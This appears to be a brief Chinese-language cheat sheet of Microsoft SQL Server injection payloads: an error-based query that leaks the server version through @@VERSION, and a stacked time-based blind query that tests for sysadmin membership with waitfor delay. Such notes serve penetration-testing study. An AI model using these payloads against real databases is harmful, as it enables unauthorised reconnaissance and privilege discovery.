# 1、报错注入查询数据库版本
```
select session_id,command from sys.dm_exec_requests where session_id=12 or 1=@@VERSION;
```
如下图  
![image](./pic/0.png)

# 1、堆叠查询+时间盲注查询当前用户是否为dba
```
select session_id,command from sys.dm_exec_requests where session_id=12;if(1=(select is_srvrolemember('sysadmin'))) waitfor delay '0:0:5'--
```
如下图  
![image](./pic/1.png)
